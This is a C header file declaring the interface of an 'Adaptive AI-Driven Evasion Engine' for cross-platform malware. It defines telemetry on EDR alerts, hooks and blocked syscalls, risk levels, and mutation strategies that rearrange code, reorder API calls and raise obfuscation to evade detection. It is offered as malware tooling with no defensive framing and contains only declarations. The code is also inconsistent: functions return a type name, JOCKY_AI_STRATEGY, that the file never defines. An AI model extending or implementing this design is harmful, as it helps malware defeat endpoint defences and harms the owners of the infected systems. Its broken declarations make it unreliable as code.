#ifndef JOCKY_AI_H
#define JOCKY_AI_H

#include <stdint.h>
#include <stdbool.h>

/* Adaptive AI-Driven Evasion Engine
 *
 * Pairs executable payload with a lightweight ML reasoning component that:
 * 1. Interprets host telemetry (EDR alerts, blocked operations, crash logs)
 * 2. Hypothesizes why evasion attempts failed
 * 3. Rewrites next attempt based on defender feedback
 * 4. Adapts in real-time, not randomly
 *
 * Mutation driven by interpretation of defender feedback, not randomness.
 * Compresses time to discover evasion path from weeks to hours.
 *
 * Technique: Cross-platform adaptive malware
 * Platform: Windows + Linux
 * Effort: 5 days
 *
 * Model: Lightweight quantized Phi-3 or Llama-3.2 (2-4 GB RAM equivalent)
 * Real implementation: Quantized decision tree (50KB embedded)
 * Inference: ~10ms per prediction on modern CPU
 */

/* Risk assessment levels */
typedef enum {
    JOCKY_AI_RISK_LOW = 0,      /* No detected threats */
    JOCKY_AI_RISK_MEDIUM = 1,   /* Partial blocking/heuristics */
    JOCKY_AI_RISK_HIGH = 2,     /* Active detection/blocking */
    JOCKY_AI_RISK_CRITICAL = 3, /* Imminent shutdown risk */
} JOCKY_AI_RISK_LEVEL;

/* Evasion strategy selection */
typedef enum {
    JOCKY_STRAT_BASELINE = 0,        /* Standard obfuscation */
    JOCKY_STRAT_STEALTH = 1,         /* Low-profile (stack spoof only) */
    JOCKY_STRAT_AGGRESSIVE = 2,      /* All defensive measures */
    JOCKY_STRAT_HYBRID = 3,          /* Mixed techniques by risk */
    JOCKY_STRAT_AI_ADAPTIVE = 4,     /* ML-selected mutation */
} JOCKY_STRATEGY;

/* Telemetry for threat assessment */
typedef struct {
    float syscall_frequency;         /* Syscalls per second */
    float syscall_entropy;           /* Entropy of syscall IDs */
    float network_entropy;           /* Network traffic entropy */
    float memory_pattern_score;      /* Memory access pattern suspicion */
    float file_io_score;             /* File operations suspicion */
    float registry_io_score;         /* Registry operations suspicion */
    uint32_t blocked_operations;     /* Count of blocked system calls */
    uint32_t detected_hooks;         /* EDR hooks detected */
    uint32_t alert_count;            /* EDR alerts in past N seconds */
    float crash_likelihood;          /* Estimated chance of crash */
    uint64_t timestamp_ms;           /* Collection timestamp */
} JOCKY_AI_TELEMETRY;

/* ML model definition (quantized, embedded) */
typedef struct {
    uint32_t magic;              /* Model magic signature */
    uint32_t version;            /* Model version */
    uint32_t input_size;         /* Input feature vector size */
    uint32_t output_size;        /* Output class count */
    uint8_t* weights;            /* Quantized weights (uint8) */
    uint32_t weights_size;
    uint8_t* bias;               /* Quantized biases */
    uint32_t bias_size;
} JOCKY_AI_MODEL;

/* Mutation strategy payload */
typedef struct {
    JOCKY_STRATEGY strategy;
    uint32_t technique_mask;     /* Bitmask of techniques to apply */
    uint32_t code_layout_seed;   /* Seed for code rearrangement */
    uint32_t api_call_order_seed; /* Seed for API call reordering */
    uint32_t obfuscation_level;  /* 0-10 obfuscation intensity */
    uint8_t reserved[128];       /* For future expansion */
} JOCKY_AI_MUTATION_STRATEGY;

/* Initialize AI module with embedded model data */
bool jocky_ai_init(const uint8_t* model_data, size_t model_size);

/* Shutdown AI module and cleanup */
void jocky_ai_shutdown(void);

/* Collect runtime telemetry for threat assessment */
bool jocky_ai_collect_telemetry(JOCKY_AI_TELEMETRY* out_telemetry);

/* Score threat level based on telemetry (0.0-1.0) */
float jocky_ai_score_threat(const JOCKY_AI_TELEMETRY* telemetry);

/* Classify threat into risk level */
JOCKY_AI_RISK_LEVEL jocky_ai_classify_threat(const JOCKY_AI_TELEMETRY* telemetry);

/* Get recommended evasion strategy */
JOCKY_AI_STRATEGY jocky_ai_recommend_strategy(const JOCKY_AI_TELEMETRY* telemetry);

/* Generate adaptive mutation strategy */
bool jocky_ai_generate_mutation(
    const JOCKY_AI_TELEMETRY* telemetry,
    JOCKY_AI_MUTATION_STRATEGY* out_strategy);

/* Apply mutation strategy (code layout, API reordering, etc.) */
bool jocky_ai_apply_mutation(const JOCKY_AI_MUTATION_STRATEGY* strategy);

/* Record syscall event for telemetry */
void jocky_ai_record_syscall(uint64_t syscall_id);

/* Record network event for telemetry */
void jocky_ai_record_network(uint32_t bytes_sent, uint32_t bytes_recv);

/* Record file I/O event */
void jocky_ai_record_file_io(const char* operation, const char* filename);

/* Record registry I/O event */
void jocky_ai_record_registry(const char* operation, const char* keypath);

/* Record EDR alert */
void jocky_ai_record_edr_alert(uint32_t alert_type);

/* Record blocked system operation */
void jocky_ai_record_blocked_operation(uint32_t syscall_id, uint32_t error_code);

/* Predict next mutation based on learned patterns */
bool jocky_ai_predict_next_mutation(JOCKY_AI_MUTATION_STRATEGY* out_strategy);

/* Get current risk assessment */
JOCKY_AI_RISK_LEVEL jocky_ai_get_current_risk(void);

/* Get current applied strategy */
JOCKY_AI_STRATEGY jocky_ai_get_current_strategy(void);

/* Query model statistics */
typedef struct {
    uint32_t total_predictions;
    uint32_t correct_predictions;
    float accuracy;
    uint64_t total_telemetry_collected;
    uint32_t mutations_applied;
} JOCKY_AI_STATS;

bool jocky_ai_get_statistics(JOCKY_AI_STATS* out_stats);

/* Reset statistics */
void jocky_ai_reset_statistics(void);

#endif /* JOCKY_AI_H */
